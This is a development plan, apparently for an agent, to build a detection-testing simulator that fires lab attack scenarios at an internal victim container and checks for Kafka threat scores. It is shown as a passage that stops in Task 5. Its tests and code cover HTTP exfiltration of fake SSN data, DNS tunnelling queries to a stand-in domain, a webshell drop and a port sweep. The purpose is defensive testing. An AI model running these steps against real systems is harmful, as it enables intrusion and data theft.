# Simulation Lab v1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship a `simulator` operator tool (25th Compose service, hidden behind `profiles: [sim]`) that fires 5 curated attack scenarios at `victim-server` and verifies each one produces a `threat.scores` Kafka update within 60s — proving the 24-service data plane (#1–#7) detects real adversarial activity end-to-end.

**Architecture:** Single Python 3.12 + aiokafka Docker image. CLI invoked via `docker compose --profile sim run --rm simulator <scenario>` (with a thin host wrapper `./scripts/run-scenario.sh`). Each scenario is a Python module that drops files into a bind-mounted `monitored/` dir (visible to Wazuh FIM) or calls `victim-server` via curl/dig (visible to Zeek on victim-server's netns). After the attack, the runner opens an `AIOKafkaConsumer` on `threat.scores` with `auto_offset_reset=latest` and a unique per-invocation `group_id`, polling up to 60s for a `ThreatScoreUpdate` with `host_id=001 AND score >= 30.0`.

**Tech Stack:** Python 3.12, aiokafka ~0.10–0.12, intellifim-schemas >= 0.4, curl + dnsutils (apt), pytest + pytest-asyncio, Docker Compose.

**Reference spec:** [`docs/superpowers/specs/2026-05-22-simulation-lab-v1-design.md`](../specs/2026-05-22-simulation-lab-v1-design.md)

**Reference patterns:**
- `data-plane/reporting/Dockerfile` — context-at-`data-plane/` two-COPY pattern (schemas first, then service).
- `data-plane/reporting/src/reporting/consumer.py` — dual-mode `_extract_score` + tolerant aiokafka loop (the simulator's `kafka_tail.py` mirrors this).
- `data-plane/reporting/src/reporting/__main__.py` — uvicorn + console-script entry pattern (simulator is simpler: no server, just argparse).
- `data-plane/orchestrator/Dockerfile` — context-at-`data-plane/` for `COPY schemas + COPY <service>`.
- `data-plane/docker-compose.yml` — `victims` + `bus` networks, `victim-server` host + `monitored/` bind-mount pattern.

**Branch:** Create `feat/simulation-lab-v1` off `main` before Task 0.

---

## File Map

```
data-plane/simulator/                            ← NEW package
├── pyproject.toml
├── Dockerfile
├── .dockerignore
├── README.md
├── src/simulator/
│   ├── __init__.py                              (empty)
│   ├── __main__.py                              (CLI: argparse + dispatch + verify)
│   ├── runner.py                                (run_and_verify orchestrator)
│   ├── kafka_tail.py                            (wait_for_match wrapper around aiokafka)
│   └── scenarios/
│       ├── __init__.py                          (SCENARIOS registry: kebab name → module)
│       ├── data_exfil.py                        (FIM + zeek.http + zeek.dns + zeek.conn)
│       ├── webshell_drop.py                     (FIM + zeek.http)
│       ├── port_scan.py                         (zeek.conn flurry; pure asyncio, no nmap)
│       ├── dns_tunnel.py                        (zeek.dns burst with random subdomains)
│       └── ransomware_rapid.py                  (FIM rapid create/truncate/delete churn)
└── tests/
    ├── __init__.py
    ├── conftest.py                              (subprocess monkeypatch + tmp_path /victim-data)
    ├── test_scenarios.py                        (5 tests — one per scenario)
    ├── test_runner.py                           (3 tests — dispatch + --list + --help)
    └── test_kafka_tail.py                       (2 tests — dual-mode extract + match filter)

data-plane/scripts/
├── run-scenario.sh                              (NEW; thin wrapper)
└── run-all-scenarios.sh                         (NEW; sequential runner with PASS/FAIL summary)

# Modified
data-plane/docker-compose.yml                    (add `simulator` service block with profiles: [sim])
data-plane/README.md                             (add simulator + scenarios docs)
```

**Test totals after this sub-project:**
- New: 5 (scenarios) + 3 (runner) + 2 (kafka_tail) = **10 new Python tests**.
- Suite total: 244 + 10 = **254 Python + 5 Rego = 259 total**.

---

## Standing Rules (carried from prior sub-projects)

- **NEVER run `git commit` yourself.** Stage files via `git add <specific paths>` and ask the user to commit. (`feedback_no_self_commits.md`.)
- **Never** `docker compose down -v` unless explicitly part of a fresh-checkout DoD test (wipes Wazuh state).
- **Never** `git add .` or `git add -A`. Stage only files the task lists.
- **Never** `--no-verify` or bypass hooks/signing.
- Use the `[dev]` extra in pyproject.toml (NOT `[test]`) — matches every other service.
- Cross-package pins are RANGES (`>=X,<Y`), never `==`.
- Subprocess invocations in scenarios use `check=False` and tolerate non-zero exit codes — the goal is to send the network packet / write the file, not to have the target respond successfully.
- Each scenario module exports exactly three symbols: `NAME: str`, `DESCRIPTION: str`, `run(target_host: str) -> None`. No more, no less.

---

## Task 0: Branch + package skeleton

**Files:**
- Create: `data-plane/simulator/pyproject.toml`
- Create: `data-plane/simulator/.dockerignore`
- Create: `data-plane/simulator/README.md`
- Create: `data-plane/simulator/src/simulator/__init__.py` (empty)
- Create: `data-plane/simulator/src/simulator/scenarios/__init__.py` (empty — registry comes in Task 4)
- Create: `data-plane/simulator/tests/__init__.py` (empty)

- [ ] **Step 1: Create branch + directories**

```bash
git checkout main
git pull --ff-only
git checkout -b feat/simulation-lab-v1
mkdir -p data-plane/simulator/src/simulator/scenarios
mkdir -p data-plane/simulator/tests
```

- [ ] **Step 2: Write pyproject.toml**

`data-plane/simulator/pyproject.toml`:

```toml
[build-system]
requires = ["setuptools>=68", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "intellifim-simulator"
version = "0.1.0"
description = "IntelliFIM simulation lab — curated attack scenarios that verify the data plane detects real adversarial activity end-to-end."
requires-python = ">=3.12"
dependencies = [
    "aiokafka>=0.10,<0.13",
    "intellifim-schemas>=0.4,<1.0",
]

[project.optional-dependencies]
dev = [
    "pytest>=8,<9",
    "pytest-asyncio>=0.23,<0.25",
]

[project.scripts]
intellifim-simulator = "simulator.__main__:main"

[tool.setuptools.packages.find]
where = ["src"]

[tool.pytest.ini_options]
asyncio_mode = "auto"
testpaths = ["tests"]
```

- [ ] **Step 3: Write .dockerignore**

`data-plane/simulator/.dockerignore`:

```
__pycache__
.pytest_cache
.venv
*.egg-info
tests
```

- [ ] **Step 4: Write README.md**

`data-plane/simulator/README.md`:

````markdown
# simulator

IntelliFIM v1 simulation lab — curated attack scenarios that verify the data plane detects real adversarial activity end-to-end.

**Invocation:** `docker compose --profile sim run --rm simulator <scenario>` (or the wrapper `./scripts/run-scenario.sh`).
**Lifetime:** fire-and-exit (`--rm`). Stack stays at 24 services in normal operation.

## Scenarios

- `data-exfil` — FIM + zeek.http + zeek.dns + zeek.conn (multi-layer chain)
- `webshell-drop` — FIM + zeek.http
- `port-scan` — zeek.conn flurry
- `dns-tunnel` — zeek.dns burst
- `ransomware-rapid` — FIM rapid create/truncate/delete churn

## Local dev

```bash
cd data-plane/simulator
pip install -e .[dev]
pytest -v
```

The scenarios are exercised against the live stack via Docker Compose; see `data-plane/docker-compose.yml`.

## Smoke

```bash
# From data-plane/:
docker compose up -d
./scripts/run-all-scenarios.sh
```

## Cleanup

File-based scenarios (`data-exfil`, `webshell-drop`, `ransomware-rapid`) leave artifacts in `monitored/`. After a smoke run:

```bash
rm -rf monitored/sensitive_* monitored/cmd.php monitored/doc_*
# Or nuke everything:
sudo rm -rf monitored/* 2>/dev/null || true
```
````

- [ ] **Step 5: Create empty `__init__.py` files**

```bash
touch data-plane/simulator/src/simulator/__init__.py
touch data-plane/simulator/src/simulator/scenarios/__init__.py
touch data-plane/simulator/tests/__init__.py
```

- [ ] **Step 6: Verify local install**

```bash
cd data-plane/simulator
python -m venv .venv
. .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
python -c "import simulator; import simulator.scenarios; print('ok')"
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
```

Expected: `ok` printed.

- [ ] **Step 7: Stage + ask user to commit**

```bash
git add data-plane/simulator/pyproject.toml \
        data-plane/simulator/.dockerignore \
        data-plane/simulator/README.md \
        data-plane/simulator/src/simulator/__init__.py \
        data-plane/simulator/src/simulator/scenarios/__init__.py \
        data-plane/simulator/tests/__init__.py
git status
```

Suggested commit message: `feat(simulator): scaffold simulator package skeleton`

---

## Task 1: kafka_tail (verification gate)

**Files:**
- Create: `data-plane/simulator/src/simulator/kafka_tail.py`
- Create: `data-plane/simulator/tests/conftest.py`
- Create: `data-plane/simulator/tests/test_kafka_tail.py`

- [ ] **Step 1: Write conftest.py shared fixtures**

`data-plane/simulator/tests/conftest.py`:

```python
"""Shared fixtures for simulator tests."""
from __future__ import annotations

from dataclasses import dataclass

import pytest


@dataclass
class FakeMessage:
    """Stand-in for aiokafka.ConsumerRecord — only needs .value bytes."""
    value: bytes


@pytest.fixture
def fake_message_cls():
    return FakeMessage
```

- [ ] **Step 2: Write failing tests for kafka_tail**

`data-plane/simulator/tests/test_kafka_tail.py`:

```python
"""kafka_tail tests — dual-mode _extract_update + match-filter shape."""
from __future__ import annotations

from datetime import datetime, timezone
from uuid import uuid4

import pytest

from intellifim_schemas import ThreatScoreUpdate

from simulator.kafka_tail import _extract_update, _is_match


_T = datetime(2030, 1, 1, 0, 0, 0, tzinfo=timezone.utc)


def _make_update(host_id: str = "001", score: float = 42.0) -> ThreatScoreUpdate:
    return ThreatScoreUpdate(
        update_id=uuid4(),
        computed_at=_T,
        host_id=host_id,
        score=score,
        window_seconds=300,
        contributions_in_window=1,
        last_event_id=uuid4(),
        last_score_delta=int(score),
        last_reason="test",
    )


def test_extract_update_typed_fast_path():
    upd = _make_update()
    result = _extract_update(upd)
    assert result is upd


def test_extract_update_bytes_path(fake_message_cls):
    upd = _make_update(host_id="042", score=77.0)
    raw = upd.model_dump_json().encode()
    result = _extract_update(fake_message_cls(value=raw))
    assert isinstance(result, ThreatScoreUpdate)
    assert result.host_id == "042"
    assert result.score == 77.0


def test_extract_update_malformed_returns_none(fake_message_cls):
    assert _extract_update(fake_message_cls(value=b"not-json")) is None
    assert _extract_update(fake_message_cls(value=b'{"host_id":"001"}')) is None


def test_is_match_threshold_and_host():
    high = _make_update(host_id="001", score=42.0)
    low = _make_update(host_id="001", score=10.0)
    wrong_host = _make_update(host_id="999", score=99.0)

    assert _is_match(high, host_id="001", threshold=30.0) is True
    assert _is_match(low, host_id="001", threshold=30.0) is False
    assert _is_match(wrong_host, host_id="001", threshold=30.0) is False
    # threshold edge: score == threshold is a match
    edge = _make_update(host_id="001", score=30.0)
    assert _is_match(edge, host_id="001", threshold=30.0) is True
```

- [ ] **Step 3: Run failing tests**

```bash
cd data-plane/simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
pytest tests/test_kafka_tail.py -v
```

Expected: 4 FAIL with `ImportError: cannot import name '_extract_update' from 'simulator.kafka_tail'`.

- [ ] **Step 4: Implement kafka_tail.py**

`data-plane/simulator/src/simulator/kafka_tail.py`:

```python
"""Tails `threat.scores` after a scenario fires, waits for a qualifying update.

`auto_offset_reset="latest"` + a unique per-invocation `group_id` ensures we
only see post-attack messages. Returns the first message matching the
`(host_id, threshold)` filter, or None on timeout.
"""
from __future__ import annotations

import asyncio
import json
import logging
from uuid import uuid4

from aiokafka import AIOKafkaConsumer
from pydantic import ValidationError

from intellifim_schemas import ThreatScoreUpdate


logger = logging.getLogger(__name__)


def _extract_update(message) -> ThreatScoreUpdate | None:
    """Dual-mode: typed ThreatScoreUpdate (test fast-path) OR an object with .value bytes."""
    if isinstance(message, ThreatScoreUpdate):
        return message
    raw = getattr(message, "value", None)
    if not isinstance(raw, (bytes, bytearray)):
        return None
    try:
        payload = json.loads(raw)
        return ThreatScoreUpdate.model_validate(payload)
    except (json.JSONDecodeError, ValidationError, ValueError) as e:
        logger.warning("malformed threat.scores message: %s", e)
        return None


def _is_match(update: ThreatScoreUpdate, *, host_id: str, threshold: float) -> bool:
    return update.host_id == host_id and update.score >= threshold


async def wait_for_match(
    *,
    bootstrap: str,
    topic: str,
    host_id: str,
    threshold: float,
    timeout_seconds: float,
) -> ThreatScoreUpdate | None:
    """Open a consumer, poll for up to `timeout_seconds`, return first match or None."""
    consumer = AIOKafkaConsumer(
        topic,
        bootstrap_servers=bootstrap,
        group_id=f"intellifim-simulator-{uuid4()}",
        auto_offset_reset="latest",
        enable_auto_commit=False,
    )
    await consumer.start()
    try:
        deadline = asyncio.get_running_loop().time() + timeout_seconds
        while True:
            remaining = deadline - asyncio.get_running_loop().time()
            if remaining <= 0:
                return None
            try:
                batch = await asyncio.wait_for(
                    consumer.getmany(timeout_ms=int(min(remaining, 1.0) * 1000), max_records=64),
                    timeout=remaining,
                )
            except asyncio.TimeoutError:
                return None
            for _tp, messages in batch.items():
                for msg in messages:
                    upd = _extract_update(msg)
                    if upd is not None and _is_match(upd, host_id=host_id, threshold=threshold):
                        return upd
    finally:
        await consumer.stop()
```

- [ ] **Step 5: Run tests to verify they pass**

```bash
pytest tests/test_kafka_tail.py -v
```

Expected: `4 passed`.

- [ ] **Step 6: Stage + ask user to commit**

```bash
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
git add data-plane/simulator/src/simulator/kafka_tail.py \
        data-plane/simulator/tests/conftest.py \
        data-plane/simulator/tests/test_kafka_tail.py
git status
```

Suggested commit message: `feat(simulator): add kafka_tail wait_for_match verification gate`

---

## Task 2: Scenario stubs + registry

**Files:**
- Create: `data-plane/simulator/src/simulator/scenarios/data_exfil.py` (stub: NAME + DESCRIPTION + no-op run)
- Create: `data-plane/simulator/src/simulator/scenarios/webshell_drop.py` (stub)
- Create: `data-plane/simulator/src/simulator/scenarios/port_scan.py` (stub)
- Create: `data-plane/simulator/src/simulator/scenarios/dns_tunnel.py` (stub)
- Create: `data-plane/simulator/src/simulator/scenarios/ransomware_rapid.py` (stub)
- Modify: `data-plane/simulator/src/simulator/scenarios/__init__.py` (SCENARIOS registry)

Task 2 ships the SHAPE — 5 modules, each exporting `NAME`, `DESCRIPTION`, and a stub `run()`. Real attack logic lands in Tasks 5–9. The registry lets `runner.py` (Task 3) dispatch by kebab name without import-side-effects.

- [ ] **Step 1: Write `data_exfil.py` stub**

`data-plane/simulator/src/simulator/scenarios/data_exfil.py`:

```python
"""data-exfil scenario — FIM + zeek.http + zeek.dns + zeek.conn.

Drops a sensitive-looking file in /victim-data, POSTs it to victim-server,
then issues a DNS query to a low-rep domain. Each step is visible to a
different normalizer.
"""
from __future__ import annotations


NAME = "data-exfil"
DESCRIPTION = "Multi-layer chain: write sensitive file, exfil via HTTP POST, DNS lookup to low-rep domain"


def run(target_host: str) -> None:
    """Implemented in Task 5."""
    raise NotImplementedError("data-exfil scenario not implemented yet")
```

- [ ] **Step 2: Write `webshell_drop.py` stub**

`data-plane/simulator/src/simulator/scenarios/webshell_drop.py`:

```python
"""webshell-drop scenario — FIM + zeek.http."""
from __future__ import annotations


NAME = "webshell-drop"
DESCRIPTION = "Drop a PHP webshell into /victim-data and curl it with a command arg"


def run(target_host: str) -> None:
    """Implemented in Task 6."""
    raise NotImplementedError("webshell-drop scenario not implemented yet")
```

- [ ] **Step 3: Write `port_scan.py` stub**

`data-plane/simulator/src/simulator/scenarios/port_scan.py`:

```python
"""port-scan scenario — zeek.conn flurry (pure asyncio, no nmap)."""
from __future__ import annotations


NAME = "port-scan"
DESCRIPTION = "Burst TCP-connect sweep against victim-server ports 1..1024"


def run(target_host: str) -> None:
    """Implemented in Task 7."""
    raise NotImplementedError("port-scan scenario not implemented yet")
```

- [ ] **Step 4: Write `dns_tunnel.py` stub**

`data-plane/simulator/src/simulator/scenarios/dns_tunnel.py`:

```python
"""dns-tunnel scenario — zeek.dns burst with random-base32 subdomains."""
from __future__ import annotations


NAME = "dns-tunnel"
DESCRIPTION = "50 DNS queries with long random subdomains under exfil.tunnel.invalid"


def run(target_host: str) -> None:
    """Implemented in Task 8."""
    raise NotImplementedError("dns-tunnel scenario not implemented yet")
```

- [ ] **Step 5: Write `ransomware_rapid.py` stub**

`data-plane/simulator/src/simulator/scenarios/ransomware_rapid.py`:

```python
"""ransomware-rapid scenario — FIM rapid create/truncate/delete churn."""
from __future__ import annotations


NAME = "ransomware-rapid"
DESCRIPTION = "Rapidly create, truncate, and delete 30 files in /victim-data"


def run(target_host: str) -> None:
    """Implemented in Task 9."""
    raise NotImplementedError("ransomware-rapid scenario not implemented yet")
```

- [ ] **Step 6: Write the registry**

`data-plane/simulator/src/simulator/scenarios/__init__.py`:

```python
"""Scenario registry — kebab-case CLI name → module."""
from __future__ import annotations

from types import ModuleType

from simulator.scenarios import (
    data_exfil,
    dns_tunnel,
    port_scan,
    ransomware_rapid,
    webshell_drop,
)


SCENARIOS: dict[str, ModuleType] = {
    data_exfil.NAME: data_exfil,
    webshell_drop.NAME: webshell_drop,
    port_scan.NAME: port_scan,
    dns_tunnel.NAME: dns_tunnel,
    ransomware_rapid.NAME: ransomware_rapid,
}
```

- [ ] **Step 7: Verify registry imports cleanly**

```bash
cd data-plane/simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
python -c "from simulator.scenarios import SCENARIOS; print(sorted(SCENARIOS))"
```

Expected:
```
['data-exfil', 'dns-tunnel', 'port-scan', 'ransomware-rapid', 'webshell-drop']
```

- [ ] **Step 8: Run full suite to confirm no regressions**

```bash
pytest -v
```

Expected: `4 passed` (kafka_tail tests from Task 1).

- [ ] **Step 9: Stage + ask user to commit**

```bash
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
git add data-plane/simulator/src/simulator/scenarios/__init__.py \
        data-plane/simulator/src/simulator/scenarios/data_exfil.py \
        data-plane/simulator/src/simulator/scenarios/webshell_drop.py \
        data-plane/simulator/src/simulator/scenarios/port_scan.py \
        data-plane/simulator/src/simulator/scenarios/dns_tunnel.py \
        data-plane/simulator/src/simulator/scenarios/ransomware_rapid.py
git status
```

Suggested commit message: `feat(simulator): add 5 scenario stubs + registry`

---

## Task 3: Runner + CLI entry

**Files:**
- Create: `data-plane/simulator/src/simulator/runner.py`
- Create: `data-plane/simulator/src/simulator/__main__.py`
- Create: `data-plane/simulator/tests/test_runner.py`

- [ ] **Step 1: Write failing tests for runner + CLI**

`data-plane/simulator/tests/test_runner.py`:

```python
"""Runner + CLI tests — dispatch, --list, --help, unknown-name handling."""
from __future__ import annotations

import sys

import pytest

from simulator.__main__ import main
from simulator.runner import dispatch


def test_dispatch_returns_module_for_known_name():
    mod = dispatch("data-exfil")
    assert mod.NAME == "data-exfil"


def test_dispatch_raises_on_unknown_name():
    with pytest.raises(KeyError):
        dispatch("nonsense-scenario")


def test_cli_list_prints_all_five(capsys):
    with pytest.raises(SystemExit) as exc:
        main(["--list"])
    assert exc.value.code == 0
    out = capsys.readouterr().out
    for name in ("data-exfil", "webshell-drop", "port-scan", "dns-tunnel", "ransomware-rapid"):
        assert name in out
```

- [ ] **Step 2: Run failing tests**

```bash
cd data-plane/simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
pytest tests/test_runner.py -v
```

Expected: 3 FAIL with `ImportError: cannot import name 'dispatch' from 'simulator.runner'` (and `main` from `simulator.__main__`).

- [ ] **Step 3: Implement runner.py**

`data-plane/simulator/src/simulator/runner.py`:

```python
"""Scenario dispatch + run_and_verify orchestrator.

`dispatch(name)` returns the scenario module. `run_and_verify(...)` calls
`module.run(target_host)` then awaits `wait_for_match(...)` and returns
an exit code per the CLI contract.
"""
from __future__ import annotations

import asyncio
import logging
from types import ModuleType

from simulator.kafka_tail import wait_for_match
from simulator.scenarios import SCENARIOS


logger = logging.getLogger(__name__)


def dispatch(name: str) -> ModuleType:
    """Return the scenario module by kebab name. Raises KeyError if unknown."""
    return SCENARIOS[name]


async def run_and_verify(
    *,
    name: str,
    target_host: str,
    bootstrap: str,
    topic: str,
    host_id: str,
    threshold: float,
    timeout_seconds: float,
) -> int:
    """Fire scenario, then tail kafka. Return CLI exit code."""
    try:
        module = dispatch(name)
    except KeyError:
        print(f"unknown scenario: {name}; try --list")
        return 1

    print(f"running scenario: {module.NAME} → {target_host}")
    try:
        # Scenario.run is sync (subprocess + file I/O). Off-load to a thread
        # so a slow scenario can't block the asyncio loop indefinitely.
        await asyncio.to_thread(module.run, target_host)
    except Exception as e:
        print(f"scenario raised: {type(e).__name__}: {e}")
        return 3

    print(f"attack complete; tailing {topic} up to {timeout_seconds}s (threshold={threshold}, host_id={host_id})...")
    try:
        match = await wait_for_match(
            bootstrap=bootstrap,
            topic=topic,
            host_id=host_id,
            threshold=threshold,
            timeout_seconds=timeout_seconds,
        )
    except Exception as e:
        print(f"could not reach kafka: {type(e).__name__}: {e}")
        return 4

    if match is None:
        print(f"✗ NO DETECTION within {timeout_seconds}s")
        return 2

    print(
        f"✓ DETECTED score={match.score} delta={match.last_score_delta} "
        f"reason={match.last_reason!r}"
    )
    return 0
```

- [ ] **Step 4: Implement __main__.py**

`data-plane/simulator/src/simulator/__main__.py`:

```python
"""CLI entry point for the simulator.

Console-script entry `intellifim-simulator` (declared in pyproject.toml)
invokes `main()` which calls `sys.exit(...)` with the runner's exit code.
"""
from __future__ import annotations

import argparse
import asyncio
import logging
import os
import sys

from simulator.runner import run_and_verify
from simulator.scenarios import SCENARIOS


def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="simulator",
        description="Fire an attack scenario at victim-server and verify it produces a threat score.",
    )
    p.add_argument("scenario", nargs="?", help=f"one of: {', '.join(sorted(SCENARIOS))}")
    p.add_argument("--list", action="store_true", help="list available scenarios and exit")
    p.add_argument(
        "--threshold", type=float, default=float(os.environ.get("THRESHOLD_SCORE", "30.0")),
        help="minimum score to count as detection (default: 30.0)",
    )
    p.add_argument(
        "--timeout", type=float, default=float(os.environ.get("TIMEOUT_SECONDS", "60")),
        help="seconds to wait for a threat.scores message (default: 60)",
    )
    return p


def _print_list() -> None:
    print("available scenarios:")
    for name in sorted(SCENARIOS):
        module = SCENARIOS[name]
        print(f"  {name:<20s} {module.DESCRIPTION}")


def main(argv: list[str] | None = None) -> None:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s | %(message)s",
    )
    args = _build_parser().parse_args(argv)

    if args.list:
        _print_list()
        raise SystemExit(0)

    if not args.scenario:
        print("error: scenario name required (or use --list)", file=sys.stderr)
        raise SystemExit(1)

    code = asyncio.run(run_and_verify(
        name=args.scenario,
        target_host=os.environ.get("TARGET_HOST", "victim-server"),
        bootstrap=os.environ.get("KAFKA_BOOTSTRAP", "kafka:9092"),
        topic=os.environ.get("TOPIC", "threat.scores"),
        host_id=os.environ.get("HOST_ID", "001"),
        threshold=args.threshold,
        timeout_seconds=args.timeout,
    ))
    raise SystemExit(code)


if __name__ == "__main__":
    main()
```

- [ ] **Step 5: Run tests to verify they pass**

```bash
pytest tests/test_runner.py -v
pytest -v   # full suite
```

Expected:
- `tests/test_runner.py` → **3 passed**
- Full suite → **7 passed** (4 kafka_tail + 3 runner)

- [ ] **Step 6: Verify console-script is wired**

```bash
which intellifim-simulator || true
intellifim-simulator --list
```

Expected output of `intellifim-simulator --list`:
```
available scenarios:
  data-exfil           Multi-layer chain: write sensitive file, exfil via HTTP POST, DNS lookup to low-rep domain
  dns-tunnel           50 DNS queries with long random subdomains under exfil.tunnel.invalid
  port-scan            Burst TCP-connect sweep against victim-server ports 1..1024
  ransomware-rapid     Rapidly create, truncate, and delete 30 files in /victim-data
  webshell-drop        Drop a PHP webshell into /victim-data and curl it with a command arg
```

- [ ] **Step 7: Stage + ask user to commit**

```bash
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
git add data-plane/simulator/src/simulator/runner.py \
        data-plane/simulator/src/simulator/__main__.py \
        data-plane/simulator/tests/test_runner.py
git status
```

Suggested commit message: `feat(simulator): add runner + argparse CLI (--list, --threshold, --timeout)`

---

## Task 4: Scenario test scaffolding

**Files:**
- Create: `data-plane/simulator/tests/test_scenarios.py` (failing tests for all 5 scenarios — implementation lands per-scenario in Tasks 5–9)

This task adds the tests up-front so each subsequent scenario task is strict TDD (red → green per scenario).

- [ ] **Step 1: Write failing tests for all 5 scenarios**

`data-plane/simulator/tests/test_scenarios.py`:

```python
"""Scenario tests — verify each module exports the contract + run() does the right things.

Tests mock subprocess and use tmp_path as the /victim-data mount.
"""
from __future__ import annotations

import os
import subprocess
from pathlib import Path

import pytest


# ---------- shared helpers ----------

@pytest.fixture
def victim_data(tmp_path, monkeypatch):
    """Patch the scenarios' /victim-data constant to a tmp dir."""
    d = tmp_path / "victim-data"
    d.mkdir()
    monkeypatch.setattr("simulator.scenarios.data_exfil.VICTIM_DATA", str(d))
    monkeypatch.setattr("simulator.scenarios.webshell_drop.VICTIM_DATA", str(d))
    monkeypatch.setattr("simulator.scenarios.ransomware_rapid.VICTIM_DATA", str(d))
    return d


@pytest.fixture
def captured_subprocess(monkeypatch):
    """Capture subprocess.run calls without actually executing them."""
    calls = []

    def fake_run(cmd, *args, **kwargs):
        calls.append({"cmd": cmd, "kwargs": kwargs})
        # Return a CompletedProcess-shaped object
        class _R:
            returncode = 0
            stdout = b""
            stderr = b""
        return _R()

    monkeypatch.setattr(subprocess, "run", fake_run)
    return calls


# ---------- contract checks ----------

@pytest.mark.parametrize("name", [
    "data-exfil", "webshell-drop", "port-scan", "dns-tunnel", "ransomware-rapid",
])
def test_scenario_exports_contract(name):
    from simulator.scenarios import SCENARIOS
    module = SCENARIOS[name]
    assert isinstance(module.NAME, str) and module.NAME == name
    assert isinstance(module.DESCRIPTION, str) and len(module.DESCRIPTION) > 0
    assert callable(module.run)


# ---------- per-scenario behavior tests ----------

def test_data_exfil_writes_file_and_runs_curl_dig(victim_data, captured_subprocess):
    from simulator.scenarios import data_exfil
    data_exfil.run(target_host="test-victim")

    # Wrote a sensitive-looking CSV
    files = list(victim_data.iterdir())
    assert any(f.name.startswith("sensitive_") and f.suffix == ".csv" for f in files), files
    assert any(f.stat().st_size >= 1024 for f in files)

    # Called curl POST to test-victim
    curls = [c for c in captured_subprocess if c["cmd"][0] == "curl"]
    assert any(
        "POST" in c["cmd"] and "http://test-victim/upload" in c["cmd"]
        for c in curls
    ), curls

    # Called dig with .invalid domain pointed at test-victim
    digs = [c for c in captured_subprocess if c["cmd"][0] == "dig"]
    assert any(
        "@test-victim" in c["cmd"] and any(".invalid" in arg for arg in c["cmd"])
        for c in digs
    ), digs


def test_webshell_drop_writes_php_and_curls_with_query(victim_data, captured_subprocess):
    from simulator.scenarios import webshell_drop
    webshell_drop.run(target_host="test-victim")

    php_files = [f for f in victim_data.iterdir() if f.suffix == ".php"]
    assert php_files
    body = php_files[0].read_text()
    assert "<?php" in body

    curls = [c for c in captured_subprocess if c["cmd"][0] == "curl"]
    assert any(
        any("http://test-victim/" in arg and ".php?" in arg for arg in c["cmd"])
        for c in curls
    ), curls


def test_port_scan_attempts_many_ports(monkeypatch):
    """port_scan uses asyncio.open_connection — assert it's called many times."""
    from simulator.scenarios import port_scan
    attempts = []

    async def fake_open(host, port, *args, **kwargs):
        attempts.append((host, port))
        raise ConnectionRefusedError()   # most ports closed; expected

    monkeypatch.setattr("simulator.scenarios.port_scan.asyncio.open_connection", fake_open)

    port_scan.run(target_host="test-victim")

    # All attempts should hit the target host
    assert all(host == "test-victim" for host, _ in attempts)
    # Should have tried at least 500 distinct ports (the actual sweep is 1..1024)
    distinct_ports = {p for _, p in attempts}
    assert len(distinct_ports) >= 500


def test_dns_tunnel_issues_many_dig_calls(captured_subprocess):
    from simulator.scenarios import dns_tunnel
    dns_tunnel.run(target_host="test-victim")

    digs = [c for c in captured_subprocess if c["cmd"][0] == "dig"]
    assert len(digs) >= 50
    # Each dig must have a unique label under exfil.tunnel.invalid
    queried = set()
    for c in digs:
        # last positional before flags is the domain (or with @host between)
        for arg in c["cmd"]:
            if arg.endswith(".exfil.tunnel.invalid"):
                queried.add(arg)
    assert len(queried) >= 50


def test_ransomware_rapid_churns_files(victim_data):
    from simulator.scenarios import ransomware_rapid
    ransomware_rapid.run(target_host="test-victim")

    # After the churn, no doc_*.txt should remain (all deleted at the end)
    remaining_docs = [f for f in victim_data.iterdir() if f.name.startswith("doc_")]
    assert remaining_docs == []
```

- [ ] **Step 2: Run failing tests**

```bash
cd data-plane/simulator
python -m venv .venv && . .venv/bin/activate
pip install /home/aditya/Documents/IntelliFIM/data-plane/schemas
pip install -e .[dev]
pytest tests/test_scenarios.py -v
```

Expected: 5 contract tests PASS (stubs satisfy the contract), 5 behavior tests FAIL with `NotImplementedError` or `AttributeError` (no `VICTIM_DATA` constant yet).

- [ ] **Step 3: Stage + ask user to commit**

```bash
deactivate
rm -rf .venv
cd ../..
rm -rf data-plane/schemas/build/
git add data-plane/simulator/tests/test_scenarios.py
git status
```

Suggested commit message: `test(simulator): scaffold scenario tests (TDD red baseline)`

---

## Task 5: Implement `data-exfil` scenario

**Files:**
- Modify: `data-plane/simulator/src/simulator/scenarios/data_exfil.py` (replace stub `run()`)

- [ ] **Step 1: Implement `data_exfil.py`**

Replace the entire contents of `data-plane/simulator/src/simulator/scenarios/data_exfil.py`:

```python
"""data-exfil scenario — FIM + zeek.http + zeek.dns + zeek.conn.

Drops a sensitive-looking file in /victim-data, POSTs it to victim-server,
then issues a DNS query to a low-rep domain. Each step is visible to a
different normalizer.
"""
from __future__ import annotations

import os
import subprocess
import time


NAME = "data-exfil"
DESCRIPTION = "Multi-layer chain: write sensitive file, exfil via HTTP POST, DNS lookup to low-rep domain"

VICTIM_DATA = "/victim-data"


def run(target_host: str) -> None:
    # 1. Write an 8 KB sensitive-looking CSV — FIM `created` event
    os.makedirs(VICTIM_DATA, exist_ok=True)
    suffix = int(time.time())
    file_path = os.path.join(VICTIM_DATA, f"sensitive_2026q2_payroll_{suffix}.csv")
    with open(file_path, "w") as f:
        f.write("employee_id,name,ssn,salary,bonus\n")
        # ~8 KB of plausible CSV-shaped junk
        for i in range(200):
            f.write(f"{1000 + i},Employee {i},123-45-{6000 + i:04d},{50000 + i * 10},{i * 7}\n")

    # 2. curl POST the file to victim-server — zeek.http event
